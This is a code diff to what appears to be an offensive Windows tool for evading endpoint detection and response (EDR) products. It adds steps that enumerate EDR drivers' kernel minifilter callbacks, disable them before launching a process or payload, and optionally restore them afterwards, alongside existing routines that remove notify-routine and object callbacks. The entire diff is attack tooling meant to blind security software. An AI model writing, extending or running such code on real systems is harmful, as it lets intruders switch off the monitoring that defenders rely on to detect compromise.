@@ -21,6 +21,7 @@
 #include "ProcessDumpDirectSyscalls.h"
 #include "NtoskrnlOffsets.h"
 #include "ObjectCallbacks.h"
+#include "MinifilterCallbacks.h"
 #include "PEBBrowse.h"
 #include "RunAsPPL.h"
 #include "Syscalls.h"
@@ -171,6 +172,7 @@ Other options:\n\
     BOOL ETWTIState = FALSE;
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
+    BOOL foundMinifilterCallbacks = FALSE;
     HOOK* hooks = NULL;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
@@ -434,6 +436,7 @@ Other options:\n\
             _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
             return EXIT_FAILURE;
         }
+
         foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
         if (foundNotifyRoutineCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
@@ -444,6 +447,14 @@ Other options:\n\
         foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
         _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
         if (foundObjectCallbacks) {
+            isSafeToExecutePayloadKernelland = FALSE;
+        }
+        _putts_or_not(TEXT(""));
+
+        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered for minifilters..."));
+        foundMinifilterCallbacks = EnumMinifilterCallbacks(foundEDRDrivers);
+        _tprintf_or_not(TEXT("[+] [MinifilterCallblacks]\tObject callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
+        if (foundMinifilterCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
         }
         _putts_or_not(TEXT(""));
@@ -664,6 +675,11 @@ Other options:\n\
                 DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
+            if (foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Disabling Minifiter callbacks..."));
+                DisableMinifilterCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
 
             /*
             * 2/3 : Starting "resursively" our process.
@@ -701,6 +717,11 @@ Other options:\n\
             if (restoreCallbacks == TRUE && foundObjectCallbacks) {
                 _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
                 EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
+            if (restoreCallbacks == TRUE && foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
+                EnableMinifilterCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
 
